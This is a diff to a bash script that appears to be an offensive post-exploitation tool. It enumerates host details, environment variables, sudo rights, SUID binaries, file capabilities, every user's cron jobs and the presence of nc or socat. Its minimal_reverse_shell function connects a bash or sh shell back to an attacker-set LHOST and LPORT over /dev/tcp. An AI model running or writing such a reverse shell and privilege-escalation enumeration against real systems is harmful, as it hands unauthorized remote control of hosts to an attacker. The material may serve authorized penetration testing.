@@ -30,47 +30,79 @@ EOF
   exit 1
 }
 
+print_section() {
+  sleep 1
+  echo -e "\n================================================================="
+  echo -e "\t\t[*] $1"
+  echo "================================================================="
+}
+
 quick_checks() {
-  echo "[*] Quick System Overview"
-  echo "Hostname: $(hostname)"
-  echo "User: $(whoami)"
-  echo "Kernel: $(uname -r)"
-  echo "Uptime: $(uptime -p)"
-  echo "CPU Info: $(lscpu | grep 'Model name' | head -n1 | cut -d ':' -f2 | xargs)"
-  echo "Memory Usage:"
-  free -h | head -n2
-  echo "Disk Usage (root):"
-  df -h / | tail -1
-  echo "Top 5 processes by memory:"
+  print_section "Quick System Overview"
+  echo "[+] Hostname     : $(hostname)"
+  echo "[+] User         : $(whoami)"
+  echo "[+] Kernel       : $(uname -r)"
+  echo "[+] Uptime       : $(uptime -p)"
+  echo "[+] CPU Model    : $(lscpu | grep 'Model name' | head -1 | cut -d ':' -f2 | xargs)"
+  echo "[+] Memory Usage :"
+  free -h | grep -E "Mem|Swap"
+
+  print_section "Disk Usage (root)"
+  df -h / | awk 'NR==1 || NR==2'
+
+  print_section "Top 5 Processes (Memory)"
   ps aux --sort=-%mem | head -n6
-  echo "Open ports:"
-  ss -tuln | head -n10
+
+  print_section "Open TCP/UDP Ports"
+  ss -tuln | grep -E 'LISTEN|udp'
+}
+
+env_and_binaries() {
+  print_section "ENV & BINARIES"
+  echo "[+] Available shells:"
+  cat /etc/shells 2>/dev/null
+
+  echo -e "\n[+] PATH:"
+  echo "$PATH"
+
+  echo -e "\n[+] Available Language Interpreters:"
+  for bin in python python3 perl ruby gcc nc socat; do
+    which $bin &>/dev/null && echo " - $bin: $(which $bin)"
+  done
 }
 
 full_checks() {
-  echo "[*] Full System Enumeration"
   quick_checks
-  echo "=== Environment Variables ==="
-  env
-  echo "=== Current User Sudo Privileges ==="
-  sudo -l 2>/dev/null || echo "No sudo or not allowed."
-  echo "=== SUID files (top 10) ==="
+  env_and_binaries
+
+  print_section "Environment Variables"
+  printenv
+
+  print_section "Sudo Privileges"
+  sudo -l 2>/dev/null || echo " - Not allowed or no sudo access"
+
+  print_section "SUID Files (Top 10)"
   find / -perm -4000 -type f 2>/dev/null | head -n10
-  echo "=== Capabilities ==="
+
+  print_section "File Capabilities"
   getcap -r / 2>/dev/null
-  echo "=== Network Interfaces and Routes ==="
+
+  print_section "Network Interfaces"
   ip a
+
+  print_section "Routing Table"
   ip r
-  echo "=== Scheduled Cron Jobs ==="
+
+  print_section "Cron Jobs"
   for user in $(cut -f1 -d: /etc/passwd); do
-    echo "Cron jobs for $user:"
-    crontab -u $user -l 2>/dev/null
+    crontab -u "$user" -l 2>/dev/null | grep -v '^#' && echo "--- [$user] ---"
   done
-  echo "=== Docker / Container Check ==="
+
+  print_section "Docker Check"
   if command -v docker >/dev/null 2>&1; then
     docker ps -a
   else
-    echo "Docker not installed."
+    echo " - Docker not installed"
   fi
 }
 
@@ -79,32 +111,25 @@ minimal_reverse_shell() {
     echo "[!] Please set LHOST and LPORT environment variables."
     exit 1
   fi
-  echo "[*] Attempting minimal reverse shell to $LHOST:$LPORT"
 
-  # Try bash
+  print_section "Reverse Shell Attempt"
+  echo "[*] Trying to connect back to $LHOST:$LPORT"
+
   if command -v bash >/dev/null 2>&1; then
     bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
-    exit
-  fi
-
-  # Try sh
-  if command -v sh >/dev/null 2>&1; then
+  elif command -v sh >/dev/null 2>&1; then
     sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1
-    exit
+  else
+    echo "[!] No suitable shell found for reverse connection."
+    exit 1
   fi
-
-  echo "[!] No suitable shell found for reverse shell."
-  exit 1
 }
 
-# Main
-if [[ $# -eq 0 ]]; then
-  show_usage
-fi
-
-case $1 in
+# Entry point
+case "$1" in
   --short)
     quick_checks
+    env_and_binaries
     ;;
   --full)
     full_checks
